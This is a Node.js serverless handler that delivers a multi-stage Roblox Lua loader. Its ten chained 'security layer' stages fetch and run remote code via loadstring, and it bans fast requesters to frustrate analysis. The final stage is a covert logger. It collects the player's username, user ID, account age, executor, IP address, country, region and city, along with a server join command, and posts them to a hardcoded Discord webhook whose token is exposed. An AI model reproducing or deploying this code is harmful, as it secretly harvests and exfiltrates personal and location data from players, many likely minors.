const https = require('https');
const crypto = require('crypto');

let sessions = {};
let blacklist = {}; 
const SECRET_SALT = "NDRAAWZAJA";

// Replace with your actual Discord Webhook URL
const WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

async function checkSystemHealth(msg) {
    const data = JSON.stringify({ content: msg });
    const url = new URL(WEBHOOK);
    return new Promise((resolve) => {
        const req = https.request({
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            timeout: 1500,
            headers: { 'Content-Type': 'application/json' }
        }, (res) => resolve(res.statusCode >= 200 && res.statusCode < 300));
        req.on('error', () => resolve(false));
        req.write(data);
        req.end();
    });
}

module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'text/plain');

    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
        const agent = req.headers['user-agent'] || "";
        const { step, id, key, unban_key, sig } = req.query;
        const host = req.headers.host;
        const currentPath = req.url.split('?')[0]; 

        if (unban_key && sig) {
            const expectedSig = crypto.createHmac('sha256', SECRET_SALT).update(unban_key).digest('hex');
            if (sig === expectedSig) {
                delete blacklist[ip];
                return res.status(200).send("System: Access Restored for IP " + ip);
            }
        }

        if (blacklist[ip]) {
            return res.status(403).send("warn('Zifi: IP Address Banned.')");
        }

        const currentStep = parseInt(step) || 0;
        const now = Date.now();

        // 3. RAPID-FIRE / BOT DETECTION
        if (currentStep > 0) {
            if (!sessions[ip] || sessions[ip].lastStep !== currentStep - 1 || key !== sessions[ip].nextKey) {
                return res.status(200).send("warn('Vercel: Invocation Error (Inconsistent Layer Flow)')");
            }

            const timeDiff = now - sessions[ip].lastTime;
            if (timeDiff < 100) { 
                blacklist[ip] = true;
                const ubk = Buffer.from(`${ip}_${now}`).toString('base64');
                const signature = crypto.createHmac('sha256', SECRET_SALT).update(ubk).digest('hex');
                
                // MENGGUNAKAN currentPath untuk link unban
                await checkSystemHealth(`🚨 **BOT DETECTED!**\nIP: \`${ip}\` requested Layer ${currentStep} too fast (${timeDiff}ms).\nUnban Link: https://${host}${currentPath}?unban_key=${ubk}&sig=${signature}`);
                
                return res.status(403).send("warn('Vercel: Connection Terminated (Bot Activity Detected)')");
            }
        }

        // --- LAYER LOGIC ---

        // INITIAL STEP (Step 0)
        if (currentStep === 0) {
            if (!agent.includes("Roblox")) {
                return res.status(200).send("NGAPAIN BANG?");
            }
            
            const sessionID = Math.random().toString(36).substring(2, 12);
            const firstKey = Math.random().toString(36).substring(2, 8);
            sessions[ip] = { id: sessionID, lastStep: 0, nextKey: firstKey, lastTime: now };

            return res.status(200).send(
`local sid, nkey = "${sessionID}", "${firstKey}"
task.wait(0.2)
local response = game:HttpGet("https://${host}${currentPath}?step=1&id="..sid.."&key="..nkey, true)
if response then loadstring(response)() end`
            );
        }

        // INTERMEDIATE STEPS (Step 1 to 9)
        if (currentStep >= 1 && currentStep <= 9) {
            const nextKey = Math.random().toString(36).substring(2, 8);
            sessions[ip].lastStep = currentStep;
            sessions[ip].nextKey = nextKey;
            sessions[ip].lastTime = now;

            return res.status(200).send(
`-- Layer ${currentStep} Secure Handshake
task.wait(0.15)
local r = game:HttpGet("https://${host}${currentPath}?step=${currentStep + 1}&id=${id}&key=${nextKey}", true)
if r then loadstring(r)() end`
            );
        }

        // FINAL PAYLOAD (Step 10)
        if (currentStep === 10) {
            await checkSystemHealth(`🛡️ **System Success**\nIP: \`${ip}\` successfully passed 10 security layers.`);
            delete sessions[ip];

            return res.status(200).send(
`local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

local request = syn and syn.request or http_request or (http and http.request)
local webhook = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5"

local function getFlagEmoji(countryCode)
    local function toRegionalIndicator(char)
        return utf8.char(0x1F1E6 - string.byte("A") + string.byte(char))
    end
    return toRegionalIndicator(countryCode:sub(1,1)) .. toRegionalIndicator(countryCode:sub(2,2))
end

local ipData, gameInfo
pcall(function()
    ipData = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
end)

pcall(function()
    gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
end)

local flag = ipData and ipData.country_code and getFlagEmoji(ipData.country_code) or ""
local serverPlayers = #Players:GetPlayers()
local serverMaxPlayers = Players.MaxPlayers
local jobId = tostring(game.JobId or "Unknown")

local function formatAccountAge(userId)
    if not request then return "-" end

    local success, response = pcall(function()
        return request({
            Url = "https://users.roblox.com/v1/users/"..userId,
            Method = "GET"
        })
    end)
    if not success or not response or not response.Body then
        return "-"
    end

    local userData
    local decodeSuccess, decodeResult = pcall(function()
        return HttpService:JSONDecode(response.Body)
    end)
    if decodeSuccess then
        userData = decodeResult
    else
        return "-"
    end

    if not userData or not userData.created then
        return "-"
    end

    local createdStr = userData.created
    local year = tonumber(createdStr:sub(1,4))
    local month = tonumber(createdStr:sub(6,7))
    local day = tonumber(createdStr:sub(9,10))

    local creationDate = os.time({year=year, month=month, day=day})
    local now = os.time()

    local diff = os.difftime(now, creationDate)
    local days = math.floor(diff / 86400)

    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    local remDays = days % 30

    if days < 30 then
        return string.format("%d Hari / - Bulan / - Tahun", days)
    elseif years < 1 then
        return string.format("%d Hari / %d Bulan / - Tahun", days, months)
    else
        return string.format("%d Hari / %d Bulan / %d Tahun", days, months, years)
    end
end

local function getExecutorVersion()
    if syn and syn.version then
        return syn.version
    elseif KRNL_LOADED then
        return "KRNL (version unknown)"
    elseif isexecutorclosure then
        return "Executor Closure"
    end
    return "Unknown Version"
end

local executorName = identifyexecutor and identifyexecutor() or "Unknown"
local executorVersion = getExecutorVersion()
local accountAgeFormatted = formatAccountAge(LocalPlayer.UserId)

local embed = {
    ["title"] = "📢 Player Info Logger",
    ["color"] = 16753920,
    ["fields"] = {
        {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
        {["name"] = "🆔 User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
        {["name"] = "📅 Account Age", ["value"] = accountAgeFormatted, ["inline"] = true},
        {["name"] = "💻 Executor", ["value"] = executorName .. " (" .. executorVersion .. ")", ["inline"] = true},
        {["name"] = "⏰ Execute Time", ["value"] = os.date("%d-%m-%Y %H:%M:%S"), ["inline"] = true},
        {["name"] = "🌐 IP Address", ["value"] = ipData and ipData.ip or "Tidak diketahui", ["inline"] = true},
        {["name"] = "🏳️ Country", ["value"] = (flag ~= "" and (flag .. " ") or "") .. (ipData and ipData.country or "Tidak diketahui"), ["inline"] = true},
        {["name"] = "📍 Region", ["value"] = ipData and ipData.region or "Tidak diketahui", ["inline"] = true},
        {["name"] = "🏙️ City", ["value"] = ipData and ipData.city or "Tidak diketahui", ["inline"] = true},
        {["name"] = "🗺️ Map", ["value"] = string.format("[%s](https://www.roblox.com/games/%d)", gameInfo and gameInfo.Name or "Unknown", game.PlaceId), ["inline"] = false},
        {["name"] = "🆔 Job ID", ["value"] = jobId, ["inline"] = false},
        {["name"] = "👥 Players in Server", ["value"] = tostring(serverPlayers) .. " / " .. tostring(serverMaxPlayers), ["inline"] = true},
        {["name"] = "📌 Join Player Script", ["value"] = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", game.PlaceId, jobId), ["inline"] = false}
    },
    ["thumbnail"] = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png" },
    ["footer"] = { text = "Notifikasi dari Executor" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    if not request then error("Request function is not available") end
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({embeds = {embed}})
    })
end)`
            );
        }

    } catch (error) {
        console.error(error);
        return res.status(200).send("warn('Vercel: 500 Internal Server Error')");
    }
};
